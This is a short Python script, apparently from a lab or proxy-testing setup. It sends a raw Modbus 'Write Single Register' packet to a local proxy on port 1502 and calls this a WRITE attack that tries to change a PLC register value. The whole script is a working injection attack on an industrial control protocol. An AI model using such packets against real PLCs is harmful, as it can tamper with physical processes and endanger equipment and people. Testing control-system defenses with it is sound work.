import socket
import binascii

# Create TCP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to proxy
sock.connect(("127.0.0.1", 1502))

# Modbus WRITE SINGLE REGISTER (Function Code = 06)
# Attempts to change PLC register value
hex_packet = "00 01 00 00 00 06 01 06 00 10 00 FF"

# Convert hex string to bytes
packet = binascii.unhexlify(hex_packet.replace(" ", ""))

print("[*] Sending Modbus WRITE attack packet...")
sock.sendall(packet + b"\r\n")

# Receive response (if any)
response = sock.recv(1024)
print("[*] Response:", response)

sock.close()
print("[✓] WRITE attack sent")
